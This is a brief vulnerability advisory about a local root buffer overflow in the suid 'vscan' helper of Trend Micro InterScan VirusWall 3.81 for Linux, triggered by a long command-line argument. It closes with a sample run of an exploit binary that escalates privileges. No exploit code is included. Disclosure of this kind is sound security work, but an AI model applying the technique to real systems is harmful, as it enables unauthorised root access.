    Title: Local root exploit for vscan/VSAPI (=Trend Micro VirusWall 3.81 on Linux)

    Author: Sebastian Wolfgarten / sebastian@wolfgarten.com / http://www.devtarget.org

    Severity: Medium

    Description:

    The product "InterScan VirusWall 3.81 for Linux" ships a library called 
    "libvsapi.so" which is vulnerable to a memory corruption vulnerability.

    One of the applications that apparently uses this library is called "vscan"
    which is set suid root by default. It was discovered that this supporting
    program is prone to a classic buffer overflow vulnerability when a particularly
    long command-line argument is being passed and the application utilizes the flawed
    library to attempt to copy that data into a finite buffer. 

    As vscan is set suid root, this leads to arbitrary code execution with root level
    privileges. However the severity of this vulnerability is probably "medium" as by default
    the vscan file is only executable by the root user as well as members of the "iscan"
    group which is created during the installation of the software.

    Example:

    sebastian@debian31:~$ ./tmvwall381v3_exp

    Okay, /opt/trend/ISBASE/IScan.BASE/vscan is executable and by the way, your current user id is 5002.

    Executing /opt/trend/ISBASE/IScan.BASE/vscan. Afterwards check your privilege level with id or whoami!
